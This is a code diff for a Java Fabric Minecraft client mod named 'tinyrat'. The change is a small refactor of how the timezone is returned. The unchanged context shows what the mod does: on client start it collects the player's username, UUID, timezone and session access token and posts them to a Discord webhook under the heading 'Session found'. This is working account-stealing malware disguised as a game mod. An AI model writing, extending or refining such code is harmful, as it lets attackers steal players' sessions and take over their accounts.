@@ -1,5 +1,7 @@
 package com.github.tinyrat;
 
+import java.time.ZoneId;
+
 import net.fabricmc.api.ClientModInitializer;
 import net.minecraft.client.MinecraftClient;
 import net.minecraft.client.session.Session;
@@ -7,8 +9,6 @@ import net.minecraft.client.session.Session;
 import com.github.tinyrat.utils.ConfigLoader;
 import com.github.tinyrat.utils.DiscordEmbed;
 import com.github.tinyrat.utils.DiscordWebhook;
-
-import java.time.ZoneId;
 
 public class Entry implements ClientModInitializer {
     public static final String MOD_ID = "tinyrat";
@@ -27,16 +27,16 @@ public class Entry implements ClientModInitializer {
 
         DiscordEmbed embed = new DiscordEmbed("Session found");
 
-        String currentTimezone = this.getTimezone();
+        ZoneId currentTimezone = this.getTimezone();
 
         embed.addln("**Username**: [" + session.getUsername() + "](https://namemc.com/profile/" + session.getUuidOrNull() +")");
-        embed.addln("**Timezone:** `" + currentTimezone + "`\n");
+        embed.addln("**Timezone:** `" + currentTimezone.toString() + "`\n");
         embed.addln("**Session token**:\n||```" + session.getAccessToken() + "```||");
 
         webhook.sendEmbed(embed);
     }
 
-    private String getTimezone() {
-        return java.time.ZoneId.systemDefault().toString();
+    private ZoneId getTimezone() {
+        return java.time.ZoneId.systemDefault();
     }
 }
